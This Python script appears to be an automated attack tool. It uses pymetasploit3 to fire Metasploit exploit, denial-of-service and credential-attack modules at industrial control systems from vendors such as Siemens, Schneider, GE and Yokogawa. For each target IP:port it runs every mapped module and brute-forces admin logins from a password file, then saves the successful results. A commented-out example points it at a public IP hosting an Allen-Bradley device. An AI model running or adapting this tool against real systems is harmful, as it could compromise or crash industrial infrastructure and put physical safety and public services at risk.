from pymetasploit3.msfrpc import MsfRpcClient
import re
import sys
import signal
import random
from contextlib import contextmanager

class TimeoutException(Exception): pass

@contextmanager
def time_limit(seconds):
    def signal_handler(signum, frame):
        raise TimeoutException
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

vendorMapmodel={
    'Advantech WebAccess':['admin/scada/advantech_webaccess_dbvisitor_sqli'],
    'General Electric':['admin/scada/ge_proficy_substitute_traversal','gather/d20pass','dos/scada/d20_tftp_overflow',
                        'windows/scada/ge_proficy_cimplicity_gefebt'],
    'Schneider':['admin/scada/modicon_command','admin/scada/modicon_password_recovery','admin/scada/modicon_stux_transfer',
                 'windows/scada/citect_scada_odbc'],
    'Rockwell Automation/Allen-Bradley':['admin/scada/multi_cip_command'],
    'PhoenixContact PLC':['admin/scada/phoenix_command'],
    'Beckhoff':['dos/scada/beckhoff_twincat'],
    '7-Technologies':['dos/scada/igss9_dataserver','windows/scada/igss9_igssdataserver_listall',
                      'windows/scada/igss9_igssdataserver_rename','windows/scada/igss9_misc',
                      'windows/scada/igss_exec_17'],
    'Digi':['scanner/scada/digi_addp_reboot','scanner/scada/digi_addp_version','scanner/scada/digi_realport_serialport_scan','scanner/scada/digi_realport_version'],
    'Indusoft':['windows/scada/indusoft_webstudio_exec','scanner/scada/indusoft_ntwebserver_fileaccess'],
    'Digital Bond':['scanner/scada/koyo_login'],
    'Modbus':['scanner/scada/modbus_findunitid','scanner/scada/modbusclient','scanner/scada/modbusdetect'],
    'Siemens':['windows/scada/factorylink_csservice',
               'windows/scada/factorylink_vrn_09'],
    'Sielco Sistemi':['scanner/scada/sielco_winlog_fileaccess','windows/scada/winlog_runtime',
                      'windows/scada/winlog_runtime_2'],
    'KeyHelp':['windows/browser/keyhelp_launchtripane_exec'],
    'TeeChart Professional':['windows/browser/teechart_pro'],
    'KingScada':['windows/browser/wellintech_kingscada_kxclientdownload'],
    'ScadaTec':['windows/fileformat/scadaphone_zip'],
    'ABB MicroSCADA':['windows/scada/abb_wserver_exec'],
    'Codesys':['windows/scada/codesys_gateway_server_traversal','windows/scada/codesys_web_server'],
    'AzeoTech':['windows/scada/daq_factory_bof'],
    'Iconics':['windows/scada/iconics_genbroker'],
    'MOXA':['windows/scada/moxa_mdmtool'],
    'Procyon':['windows/scada/procyon_core_server'],
    'DATAC RealWin':['windows/scada/realwin','windows/scada/realwin_on_fc_binfile_a','windows/scada/realwin_on_fcs_login',
                     'windows/scada/realwin_scpc_initialize','windows/scada/realwin_scpc_initialize_rf',
                     'windows/scada/realwin_scpc_txtevent'],
    'Measuresoft ScadaPro':['windows/scada/scadapro_cmdexe'],
    'Sunway':['windows/scada/sunway_force_control_netdbsrv'],
    'Yokogawa':['windows/scada/yokogawa_bkbcopyd_bof','windows/scada/yokogawa_bkesimmgr_bof',
                'windows/scada/yokogawa_bkfsim_vhfd','windows/scada/yokogawa_bkhodeq_bof',
                'dos/scada/yokogawa_logsvr','admin/scada/yokogawa_bkbcopyd_client']
}

def deviceTest(Vendor,IP,filepath,passwordFile):
    VendorE=Vendor.split("_")
    Vendor=""
    for item in VendorE:
        if Vendor=="":
            Vendor=Vendor+item
        else:
            Vendor=Vendor+" "+item
    print(Vendor)
    passwords = []
    with open(passwordFile, 'r') as f:
        list = f.readlines()
        for line in list:
            passwords.append(line)
    modules=None
    ipinfo=IP.split(":")
    ip=ipinfo[0]
    port=ipinfo[1]
    for key in vendorMapmodel.keys():
        if(re.search(key.lower(),Vendor.lower())):
            modules=vendorMapmodel[key]
    client=MsfRpcClient('chinazfz')
    path=None
    user=['admin','administrator','Admin','Administrator','root']
    for module in modules:
        count=0
        if module in client.modules.auxiliary:
            path='auxiliary'
        elif module in client.modules.exploits:
            path='exploit'
        exploit=client.modules.use(path,module)
        print(module)
        print(exploit.missing_required)

        useUsr=False
        usePass=False
        usepassFile=False

        for temp in exploit.options:
            if(re.search('RHOSTS',temp)):
                exploit[temp]=ip
            if(re.search('RPORT',temp)):
                if(temp in exploit.missing_required):
                    exploit[temp]=port
            if(re.search('FTPUSER',temp)):
                useUsr=True
            if(re.search('FTPPASS',temp)):
                usePass=True
            if(re.search('PASS_FILE',temp)):
                usepassFile=True
            if(re.search('DATA_ADDRESS',temp)):
                exploit[temp]=40001
            if (re.search('USERNAME', temp)):
                useUsr = True
            if (re.search('PASSWORD', temp)):
                usePass = True
            if (re.search('VERBOSE', temp)):
                exploit[temp] = True
        if useUsr==True:
            for usr in user:
                if 'FTPUSER' in exploit.options:
                    exploit['FTPUSER']=usr
                elif 'USERNAME' in exploit.options:
                    exploit['USERNAME']=usr
                if not usepassFile and usePass:
                    for password in passwords:
                        if 'FTPPASS' in exploit.options:
                            exploit['FTPPASS']=password
                        elif 'PASSWORD' in exploit.options:
                            exploit['PASSWORD']=password
                        try:
                            cid=client.consoles.console().cid
                            with time_limit(100):
                                result = client.consoles.console(cid).run_module_with_output(exploit)
                            if re.search('fail', result) or re.search('Fail', result) or re.search('FAIL', result)or re.search('reject',result):
                                pass
                            else:
                                m = module.split('/')[-1]
                                Path = filepath + m + '_' + str(count) + '.txt'
                                count=count+1

                                with open(Path, 'w') as f:
                                    writeline = "{\"ip\":\"" + IP + "\"," + "\"Vendor\":\"" + Vendor+ "\"," + "\"module\":\"" + \
                                                path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                                    f.write(writeline)
                                    f.close()
                                print(result)
                        except Exception as e:
                            print(e)
                elif usepassFile:
                    exploit['PASS_FILE'] = passwordFile
                    try:
                        cid = client.consoles.console().cid
                        with time_limit(100):
                            result = client.consoles.console(cid).run_module_with_output(exploit)
                        if re.search('fail', result) or re.search('Fail', result) or re.search('FAIL', result)or re.search('reject',result):
                            pass
                        else:
                            m=module.split('/')[-1]
                            Path = filepath + m+ '_' + str(count) + '.txt'
                            count = count + 1
                            with open(Path, 'w') as f:
                                writeline = "{\"ip\":\"" + IP + "\"," + "\"Vendor\":\"" + Vendor + "\"," + "\"module\":\"" + \
                                            path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                                f.write(writeline)
                                f.close()
                            print(result)
                    except Exception as e:
                        print(e)
        else:
            try:
                cid = client.consoles.console().cid
                with time_limit(100):
                    result = client.consoles.console(cid).run_module_with_output(exploit)
                print(result)
                m = module.split('/')[-1]
                Path = filepath + '/' + m + '_' + str(count) + '.txt'
                count = count + 1
                with open(Path, 'w') as f:
                    writeline = "{\"ip\":\"" + IP + "\"," + "\"Vendor\":\"" + Vendor + "\"," + "\"module\":\"" + \
                                path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                    f.write(writeline)
                    f.close()
                print(result)
            except Exception as e:
                print(e)
                
if __name__=='__main__':
    if len(sys.argv)>1:
        deviceTest(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
    #deviceTest("Rockwell Automation/Allen-Bradley","174.90.217.211:44818","/Users/ludam/Desktop/MetasploitResult/44818","/Users/ludam/Desktop/final/ScanScript/PassWord")